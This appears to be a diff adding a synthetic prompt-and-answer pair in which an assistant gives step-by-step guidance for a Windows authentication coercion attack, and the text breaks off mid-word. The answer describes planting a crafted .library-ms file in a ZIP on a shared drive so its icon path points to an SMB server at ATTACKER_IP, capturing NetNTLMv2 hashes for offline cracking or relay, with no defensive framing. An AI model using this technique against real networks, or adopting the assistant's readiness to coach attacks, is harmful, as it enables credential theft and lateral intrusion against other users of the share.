@@ -1,0 +1,10 @@
+Context:
+Context: Vulnerability Exploitation - Windows Library Files. You have write access to a network share that is accessible by other users. You need to coerce authentication from a machine or user account.
+Principle to Apply: 'Abuse file formats or features that trigger automatic network connections to capture credential material.'
+assistant
+**Assessment Phase**: Authentication Coercion Attack.
+**Core Principle**: Certain file types, when opened by Windows Explorer or related processes, can trigger automatic SMB connections to an attacker-controlled server. This can be used to capture NetNTLMv2 hashes for offline cracking or relay.
+**Actionable Steps**:
+1.  **Create Malicious Library File**: Use a proof-of-concept script to generate a crafted `.library-ms` file within a ZIP archive.
+    *   **Reasoning**: When this ZIP is extracted on a Windows machine (often automatically by Explorer in certain contexts), the `.library-ms` file can reference an icon path (`\\ATTACKER_IP\icon.ico`) on a remote SMB server. Attempting to display the file may trigger an authentication attempt to that server.
+**Guidance for Novel Context**: The specific CVE details will change. The underlying pri
